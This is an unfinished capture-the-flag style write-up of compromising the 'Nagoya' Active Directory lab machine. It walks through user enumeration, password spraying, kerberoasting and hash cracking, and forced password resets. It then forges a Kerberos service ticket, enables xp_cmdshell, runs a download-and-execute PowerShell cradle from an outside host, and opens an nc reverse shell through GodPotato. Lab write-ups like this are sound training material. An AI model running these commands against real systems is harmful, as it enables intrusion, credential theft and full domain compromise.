#InProgress 
```IP
192.168.150.21
```

# Enumeration
## SMB
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211114236.png?raw=true)
## Kerberos
```
./kerbrute userenum --dc 192.168.150.21 -d nagoya-industries.com /usr/share/SecLists-master/Usernames/cirt-default-usernames.txt
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211114736.png?raw=true)
I created a users.txt file with the names contained in http 80 and substituted the space between name and surname for a dot, and then confirmed these usernames with kerbrute
```
./kerbrute userenum --dc 192.168.150.21 -d nagoya-industries.com users.txt
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211120839.png?raw=true)
## LDAP
needs authentication
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211114934.png?raw=true)
## HTTP 80
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211114001.png?raw=true)

# Exploitation
create a list of seasons, months etc
apply a ruleset to it
password is Summer2023
Confirm password
```
nxc smb 192.168.150.21 -u 'fiona.clark' -p 'Summer2023'
```
```
impacket-GetUserSPNs -request -dc-ip 192.168.150.21 nagoya-industries.com/fiona.clark
```
However, the tool targeted kerberoast retrieve more hashes:
```
python3 targetedKerberoast.py -d nagoya-industries.com -u fiona.clark -p Summer2023 -v -o ../../files/targetedkerberoast.hash
```
lets crack some hashes
```
sudo hashcat -m 13100 files/targetedkerberoast.hash /usr/share/wordlists/rockyou.txt --force
```
Credentials obtained:
```
svc_mssql:Service1
```

With this credentials we can also access to smb shares which we will list with
```
smbclient //192.168.150.21/NETLOGON -U nagoya-industries.com/svc_mssql --password='Service1' -c 'recurse;ls'
```
we see some odd .exe
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211155135.png?raw=true)
```
cat ResetPassword.exe
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211155733.png?raw=true)
 it works!
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211160620.png?raw=true)
 it doesnt pwn anything, so we will take a look with bloodhound:
```
bloodhound-python -d nagoya-industries.com -c all -u 'fiona.clark' -p 'Summer2023' -ns 192.168.150.21 --zip
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211163007.png?raw=true)
we have generic all over bethan so lets change his password


```
net rpc password "bethan.webster" "Password123" -U "nagoya-industries.com"/"fiona.clark"%"Summer2023" -S "nagoya-industries.com"
```

and now we can change christopher.lewis password with bethan.webster
```
net rpc password "christopher.lewis" "Password123" -U "nagoya-industries.com"/"bethan.webster"%"Password123" -S "nagoya-industries.com"
```

and now we have access
```
evil-winrm -i 192.168.150.21 -u christopher.lewis -p 'Password123'
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211163428.png?raw=true)


# PrivEsc

## Manual

## Automated

### Peass
mssql is open locally
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212115613.png?raw=true)

psexec doesnt work
```
python /usr/share/doc/python3-impacket/examples/psexec.py nagoya-industries.com/Administrator@192.168.249.21 -k -no-pass -debug
```
we will port forward a golden ticket attack on golden ticket
```
sudo ip route add 240.0.0.1/32 dev ligolo
```
We will then create our NTLM hash from the password we already had: Service1
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212121256.png?raw=true)
Then we will create a golden ticket using that hash:
```
python3 ticketer.py -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -dc-ip 192.168.249.21 Administrator -spn MSSQL/nagoya.nagoya-industries.com
```
```
export KRB5CCNAME=/home/kali/Documents/offsec/PG/Nagoya/exploits/Administrator.ccache
```
```
impacket-mssqlclient -k -debug -target-ip 240.0.0.1 nagoya.nagoya-industries.com
```
Get execution privileges:
```
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```
execute reverse shell:
```
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.189:8000/rev.ps1") | powershell -noprofile'
```
we have impersonate privilege
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212140242.png?raw=true)
abuse it with a reverse shell and godpotato:
```
.\GodPotato-NET2.exe -cmd "\temp\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.189 1234"
```
we are NT Authority System

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212140044.png?raw=true)

### Mimikatz

# Lateral Movement
